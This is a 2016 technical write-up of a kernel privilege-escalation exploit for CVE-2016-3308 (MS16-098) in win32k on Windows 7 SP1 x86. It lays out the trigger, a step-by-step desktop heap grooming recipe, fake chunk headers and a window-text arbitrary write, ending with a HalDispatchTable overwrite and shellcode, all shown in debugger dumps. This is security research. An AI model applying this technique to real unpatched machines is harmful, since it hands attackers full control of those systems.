# Use CVE-2016-3308 corrupt win32k desktop heap

author : [@55-AA](https://twitter.com/5_5_A_A), Sept 18, 2016

##Introduction
 
Desktop heap is a kernel pool used by win32k, it can be exploited by user-mode application. Here I will describe in detail how to implement a reliable exploitation so that to read/write arbitrary address in kernel. This writeup and associated analysis are done on a win7_sp1_x86(build 17842) installation.

##Vulnerability

On August 9, 2016, Microsoft released [MS16-098](https://technet.microsoft.com/en-us/library/security/ms16-098.aspx). The vulnerability code exists within the function win32k!xxxInsertMenuItem, the function prototype is : 

    BOOL xxxInsertMenuItem(
            PMENU pMenu, 
            UINT wIndex, 
            BOOL fByPosition, 
            LPMENUITEMINFOW lpmii, 
            PUNICODE_STRING pstrItem
        );

First let's look at the pseudo bug code in the xxxInsertMenuItem :

    if (pMenu->cItems >= pMenu->cAlloced) {
        if (pMenu->rgItems) {
            pNewItems = (PITEM)DesktopAlloc(
                            pMenu->head.rpdesk,
                            (pMenu->cAlloced + CMENUITEMALLOC) * sizeof(ITEM),
                            DTAG_MENUITEM);
     ......

        pMenu->cAlloced += CMENUITEMALLOC;
        pMenu->rgItems = pNewItems;
        if (wIndex != MFMWFP_NOITEM)
            pItem = MNLookUpItem(pMenu, wIndex, fByPosition, &pMenuItemIsOn);

    ......

    pMenu->cItems++;
    if (pItem != NULL) {
        RtlMoveMemory(pItem + 1, pItem, (pMenu->cItems - 1) *
                sizeof(ITEM) - ((char *)pItem - (char *)pMenu->rgItems));
    } else {

In the code above, When the 9th(from 1st) item was added into the pMenu, DesktopAlloc() was called to re-allocate a new pMenu->rgItems. Then MNLookUpItem() was called to get the item’s location in the pMenu->rgItems. But the returned pItem by MNLookUpItem() is a rgItems of another pSubMenu, instead of the pMenu, so when the RtlMoveMemory() was called, the pItem of pSubMenu and followed bytes would be overwrote due to the mistaken size of moving.

The following is the disassembly code about the bug, which would trigger a heap overwrite, it can be leveraged to build a fake trunk:

    0: kd> u win32k!xxxInsertMenuItem+0x1f5 l8
    win32k!xxxInsertMenuItem+0x1f5:
    95d295af 6bc06c          imul    eax,eax,6Ch
    95d295b2 2bc3            sub     eax,ebx
    95d295b4 034634          add     eax,dword ptr [esi+34h]
    95d295b7 50              push    eax
    95d295b8 8d436c          lea     eax,[ebx+6Ch]
    95d295bb 53              push    ebx
    95d295bc 50              push    eax
    95d295bd e85ea40100      call    win32k!memmove (95d43a20)

To track the bug, I use these breakpoints in WinDbg :

    ba e1 win32k!xxxInsertMenuItem

    ba e1 win32k!xxxInsertMenuItem+0xf3    
    95d294e3 e843e70200      call    win32k!DesktopAlloc (836d7bf5)
    
    ba e1 win32k!xxxInsertMenuItem+0x129
    95d294e3 e80de70200      call    win32k!DesktopAlloc (836d7bf5)

    ba e1 win32k!xxxInsertMenuItem+0x1f5
    95d295af 6bc06c          imul    eax,eax,6Ch

In order to trigger the bug, the following stages need be done:

1. Create a menu.
2. Create a sub-menu as the first ITEM of the menu with ID 0x123, it is necessary setting MENUITEMINFO.hbmpItem with HBMMENU_SYSTEM.
3. Add other 7 ITEMs with ID from 0x1001 to 0x1007 into the menu.
4. Add a ITEM with ID 1 to the sub-menu.
5. Add other 8 ITEMs for the sub-menu, in order to get a tagMENU.rgItems with 16 slots. But This step is not necessary for triggering if you need only a crush.
6. Add the 9th ITEM with ID 0x123 to the menu, thus the expected RtlMoveMemory() was called with mistaken parameters.


## Desktop Heap

Desktop heap is a global pool used by all GUI process. All GUI objects, such as Window, Menu, are stored in the desktop heap, and are managed by the kernel heap allocator. The kernel heap allocator uses familiar functions such as RtlAllocateHeap and RtlFreeHeap. Unlike the user-mode heap, desktop heap do not employ any front-end allocators, so no Low Fragmentation Heap, no Lookaside list, etc. Also there is not Heap Encoding until Windows 8 and later. The following is the structure of trunk on win7\_sp1_x86:

    typedef struct _HEAP_ENTRY {
        USHORT Size;
        UCHAR Flags;
        UCHAR SegmentIndex;
        USHORT PreviousSize;
        UCHAR SegmentOffset;
        UCHAR UnusedBytes;
     } HEAP_ENTRY, *PHEAP_ENTRY;

The Size and PreviousSize fields represent the chunks size right-thifted HEAP\_GRANULARITY\_SHIFT(defined as 3 in 32-bit system) bits, the Size field specifies the current chunk, and the PreviousSize specifies the front one. The lowest bit of the Flags is usually set to HEAP\_ENTRY_BUSY(0x01), represent the chunk is in use, if not to 0x00. 

The following figure demonstrates the relationship between these fields and these chunk block. The second green underline WORD (0x000f) represents that the current chunk size is 0x78 bytes, The second black underline WORD (0x0003) represents that the front chunk size is 0x18 bytes, and The red underline WORDs (0x0001) represent that the current chunks are in use. Here, the chunk size include header size, the header is defined as HEAP_ENTRY structure above. 

![](./figure/chunk.PNG)

It is the most important feature for heap corruption, which heap allocator always get the chunk released recently. This means that we can actually allocate a chunk with any size and at certain location we want to.

## Corruption

By leveraging the bug, I can overwrite some bytes in desktop heap, thus I'll get a fake chunk, that replace a normal chunk, then I release the replaced chunk, so that the fake chunk was pushed to the top of the free chunk list. subsequently the fake chunk was reused, I can write any bytes in it, the write-able region overlap several normal chunks, but it cannot cover whole kernel-land. So I need to build another R/W primitive in the overlapped region, that take advantage of the tagWND.strName to write arbitrary address. The pointer of strName.Buffer can led us to anywhere including kernelland and userland. Of course, our target is only the nt!HalDispatchTable.

The following figure shows the procedure of heap changing:

![](./figure/fengshui.PNG)

According to the demonstrates, I corrupt the desktop heap step by step, and implement the exploitation by the following stages:

1. Create some Window with WndText size 1, loop FILL\_HOLE\_COUNT times to fill the old hole.
2. Create WND\_0 ~ WND\_5 to operate chunk data.
3. Create a menu, and create a sub-menu as the first ITEM of the menu with ID 0x123. Then add other 7 ITEMs with ID 0x1001~0x1007 into the menu.
4. Add a ITEM with ID 1 and other 7 ITEMs with ID 0x2001~0x2007 into the sub-menu.
5. Add the 9th ITEM with ID 0x2008 into the sub-menu, in order to get a tagMENU.rgItems with 16 slots.
6. Set WND_5 text 0x360 bytes to fill the original hole of sub-menu ITEMs*8.
7. Set WND_1 text 0x70 bytes, prepare the fake chunk header.
8. Set WND_2 text 0x70 bytes, build a placeholder for the fake chunk.
9. Set WND_0 text 0x6c0 bytes, build a placeholder for the future menu ITEMs*16.
10. Create the Primitive-WND with an auto-created tagPROPLIST.
11. Create the Corrupt-WND with an auto-created tagPROPLIST.
12. Set WND_3 text 0x10 bytes for a next fake chunk following the one at step 8.
13. Save the heap layout to restore it in exiting stage.
14. Reset WND_0 text to 0x700 bytes, so that to release a 0x6c0 hole.
15. Add the 9th ITEM into the menu, it reuses the chunk released at step 14, and the bug would be trigger.
16. Reset WND_2 text to 0x80 bytes, which cause the fake chunk was pushed to the top of freed list.
17. Set Corrupt-WND text 0x8e0 bytes, then the fake chunk was reused.
18. By set Primitive-WND text, execute the write-primitive to overwrite nt!HalDispatchTable[1].
19. Trigger the shellcode by calling NtQueryIntervalProfile.
20. Restore the saved heap layout and exit.

The key step above list for building heap fengshui:

In the step 7, I'll build a fake heap header in the WND_1 text, it specifies the future chunk condition. As the blue section above figure, it would overwrite the red section. The distance from 'Corrupt HDR' to 'red HDR' is 0x6c, that is the size of a ITEM. These parameters are following:

    pHeapEntry->PreviousSize = (0x6c8 + 0x78) >> HEAP_GRANULARITY_SHIFT;
	pHeapEntry->Size = 0x8e8 >> HEAP_GRANULARITY_SHIFT;
	pHeapEntry->Flags = 1;
	pHeapEntry->UnusedBytes = 8;

In the step 12, I'll build the next fake heap header in the WND_3 text, it makes heap allocator belive that these fake chunk are normally chained.

In the step 15, the bug would be triggered. Due to add the 9th ITEM, the ITEMs list are re-allocate, and reusing the WND_0 text released chunk. Thus, the distance from 'SubMenuITEMs HDR' to 'MenuITEMs HDR' is (0x6c8+0x78+0x78) bytes, these data within this region would be overwrote by themselves. In this step, the chunk headers of WND\_1, WND\_2 and MenuITEMs were harmed, To normally exit process, I save some data, so that I can restore them in step 20.

In the step 13, I save some date before they are harmed. However, I'm in user-land, so cannot read those data within kernelland. Fortunately, there is a mapped section at userland, it is the image of the desktop heap. Although it is read-only, it is sufficient for my purpose. To get the image section address in userland, the Win32ClientInfo can be used, it is an undocumented structure in TEB, let me see:

    typedef struct _CLIENTINFO { 
        ULONG_PTR CI_flags; 
        ULONG_PTR cSpins; 
        DWORD dwExpWinVer; 
        DWORD dwCompatFlags; 
        DWORD dwCompatFlags2; 
        DWORD dwTIFlags; 
        PDESKTOPINFO pDeskInfo; 
        ULONG_PTR ulClientDelta;
    } CLIENTINFO, *PCLIENTINFO;

    typedef struct _DESKTOPINFO { 
        PVOID pvDesktopBase; 
        PVOID pvDesktopLimit; 
    } DESKTOPINFO, *PDESKTOPINFO;

The field we concerned are pvDesktopBase and ulClientDelta, The pvDesktopBase point to the kernel address of the desktop heap, ulClientDeltavalue is a delta  value which specifies the offset between the userland image and the kernel address.

In addition, I need a mapped relationship from HANDLE to kernel address. There is a global variable named gSharedInfo, it is exported by user32.dll on win7 and later. It is defined as following:

    typedef struct _SHAREDINFO{
    	PSERVERINFO psi;      
    	PHANDLEENTRY aheList;
    	ULONG HeEntrySize;
    	ULONG_PTR pDispInfo;      
    	ULONG_PTR ulSharedDelta;
    	ULONG_PTR awmControl[31];
    	ULONG_PTR DefWindowMsgs;
    	ULONG_PTR DefWindowSpecMsgs;
    }SHAREDINFO,*PSHAREDINFO;

Thus, I can obtain the kernel address from a handle by the function:

    PVOID GetMappedHandlePtr(HANDLE MyHandle, PVOID * UserlandPtr)
    {
    	HANDLEENTRY * UserHandleTable = g_pSharedInfo->aheList;
    	ULONG cEntries = g_pSharedInfo->psi->cHandleEntries;
    	ULONG dwIndex = (ULONG)MyHandle & 0xFFFF;
    	ULONG dwUniq = (ULONG)MyHandle >> 16;
    	if(dwIndex <= cEntries) {
    		if (dwUniq == UserHandleTable[dwIndex].wUniq) {
    			*UserlandPtr = (PVOID)(
                    (ULONG_PTR)UserHandleTable[dwIndex].phead - g_DeltaDesktopHeap);
    			return (PVOID)UserHandleTable[dwIndex].phead;
    		}
    	}
    	return NULL;
    }

In the step 17, 18 and 20, I want to write some bytes to kernelland, so I leverage the Window text. It is a LARGE\_UNICODE\_STRING allocated on the desktop heap and associated a window object. We can found it in tagWND structure, on win7\_sp1\_x86, its offset is 0x84, and the offset 0x8c is just the pointer we can control to read/write. In userland, I can call NtUserDefSetText() to set the window's text, the contents of text would be wrote to the kernel address we want to.

In the step 19, I trigger the last target, shellcode. By calling NtQueryIntervalProfile() in userland, the hal!HaliQuerySystemInformation would be called originally, but its function pointer in the nt!HalDispatchTable has been replaced with myself function at step 18. By the way, when the 1st parameter of NtQueryIntervalProfile would be set to 1, there will be a short-circuit, due to the following code at offset 84115505:

    nt!KeQueryIntervalProfile:
    841154fd 8bff            mov     edi,edi
    841154ff 55              push    ebp
    84115500 8bec            mov     ebp,esp
    84115502 83ec10          sub     esp,10h
    84115505 83f801          cmp     eax,1
    84115508 7507            jne     nt!KeQueryIntervalProfile+0x14 (84115511)
    8411550a a108f7fa83      mov     eax,dword ptr [nt!KiProfileAlignmentFixupInterval (83faf708)]
    8411550f c9              leave
    84115510 c3              ret

Beyond that, any other value would be done.

In order to track the whole corrupting procedure conveniently, I print some central value in console. 

![](./figure/console.PNG)

According to the output, we can glance the corrupting desktop heap layout with WinDbg.

This is WND_1_Text and WND_2_Text at step 7 and step 8:

    1: kd> db fea2d7a8-8 l78*2
    fea2d7a0  0f 00 01 00 d9 00 00 08-00 00 00 00 1d 01 01 00  ................
    fea2d7b0  e8 00 00 08 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7e0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7f0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d800  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d810  00 00 00 00 00 00 00 00-0f 00 01 00 0f 00 00 08  ................
    fea2d820  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d830  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d840  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d850  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d860  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d870  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d880  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

This is the condition after be exploited at step 15 :

    0: kd> db fea2d7a8-8 l78*2
    fea2d7a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7e0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d7f0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d800  00 00 00 00 00 00 00 00-00 00 00 00 0f 00 01 00  ................
    fea2d810  d9 00 00 08 00 00 00 00-1d 01 01 00 e8 00 00 08  ................
    fea2d820  f0 36 a3 fe 10 ca a2 fe-00 00 00 00 00 00 00 00  .6..............
    fea2d830  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d840  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d850  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d860  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d870  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d880  00 00 00 00 0f 00 01 00-0f 00 00 08 00 00 00 00  ................

This is the completed fake chunk:

    0: kd> db fea2d820-8
    fea2d818  1d 01 01 00 e8 00 00 08-f0 36 a3 fe 10 ca a2 fe  .........6......
    fea2d828  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d838  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d848  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d858  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d868  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    fea2d878  00 00 00 00 00 00 00 00-00 00 00 00 0f 00 01 00  ................
    fea2d888  0f 00 00 08 00 00 00 00-00 00 00 00 00 00 00 00  ................

This is the second completed fake chunk:

    0: kd> db fea2d820-8 + 11d*8
    fea2e100  02 00 01 00 1d 01 00 08-00 00 00 00 00 00 00 00  ................
    fea2e110  0d 00 01 00 03 00 00 0c-38 26 a1 fe 80 c1 80 c1  ........8&......
    fea2e120  00 00 00 00 40 8c 47 88-00 00 00 00 00 00 c1 00  ....@.G.........
    fea2e130  00 00 00 00 00 00 00 00-00 00 00 00 18 e1 a2 fe  ................
    fea2e140  00 00 00 00 00 00 00 00-00 40 00 00 9c 88 d0 95  .........@......
    fea2e150  00 00 00 00 00 00 00 00-00 00 88 00 00 00 00 00  ................
    fea2e160  e8 3e b5 ff 06 00 00 00-00 00 00 00 80 e1 a2 fe  .>..............
    fea2e170  00 00 00 00 00 00 00 00-05 00 01 00 0d 00 00 09  ................

PrimitiveWnd tagWND.strName

    0: kd> db fea2d820 + 78 + 6c8 + 84
    fea2dfe4  02 00 00 00 04 00 00 00-fc 53 f7 83 00 00 00 00  .........S......
    fea2dff4  60 df a2 fe 17 03 10 00-00 00 00 00 00 00 00 00  `...............
    fea2e004  00 00 00 00 00 00 00 00-08 00 00 00 03 00 01 00  ................
    fea2e014  17 00 00 08 01 00 00 00-01 00 00 00 88 19 7e 01  ..............~.
    fea2e024  18 a9 00 00 17 00 01 00-03 00 00 08 fc 03 03 00  ................
    fea2e034  03 00 00 00 38 48 96 fe-40 8c 47 88 30 e0 a2 fe  ....8H..@.G.0...
    fea2e044  18 00 08 60 00 07 00 80-00 01 00 00 00 00 cf 04  ...`............
    fea2e054  00 00 00 00 00 00 00 00-60 df a2 fe 28 81 a1 fe  ........`...(...

CorruptWnd tagWND.strName

    0: kd> db fea2d820 + 78 + 6c8 + d0 + 84
    fea2e0b4  de 08 00 00 e0 08 00 00-20 d8 a2 fe 00 00 00 00  ........ .......
    fea2e0c4  30 e0 a2 fe 17 03 10 00-00 00 00 00 00 00 00 00  0...............
    fea2e0d4  00 00 00 00 00 00 00 00-08 00 00 00 03 00 01 00  ................
    fea2e0e4  17 00 00 08 01 00 00 00-01 00 00 00 90 1e 7e 01  ..............~.
    fea2e0f4  18 a9 00 00 03 00 01 00-03 00 00 08 02 00 01 00  ................
    fea2e104  1d 01 00 08 00 00 00 00-00 00 00 00 0d 00 01 00  ................
    fea2e114  03 00 00 0c 38 26 a1 fe-80 c1 80 c1 00 00 00 00  ....8&..........
    fea2e124  40 8c 47 88 00 00 00 00-00 00 c1 00 00 00 00 00  @.G.............

The shellcode pointer replaced:

    0: kd> dds nt!HalDispatchTable
    83f753f8  00000004
    83f753fc  013711c0
    83f75400  83e3c1b4 hal!HalpSetSystemInformation
    83f75404  840fe71f nt!xHalQueryBusSlots
    83f75408  00000000

    0: kd> u 013711c0
    013711c0 a188fa3701      mov     eax,dword ptr ds:[0137FA88h]
    013711c5 8b0d80fa3701    mov     ecx,dword ptr ds:[137FA80h]
    013711cb 894804          mov     dword ptr [eax+4],ecx
    013711ce 33c0            xor     eax,eax
    013711d0 c21000          ret     10h


##References

+ [An Analysis Of MS16-098](https://warroom.securestate.com/an-analysis-of-ms16-098/)
+ [Exploiting the win32k!xxxEnableWndSBArrows use-after-free (CVE 2015-0057) bug on both 32-bit and 64-bit](https://www.nccgroup.trust/globalassets/newsroom/uk/blog/documents/2015/07/exploiting-cve-2015.pdf)
+ [Kernel Attacks through User-Mode Callbacks](https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf)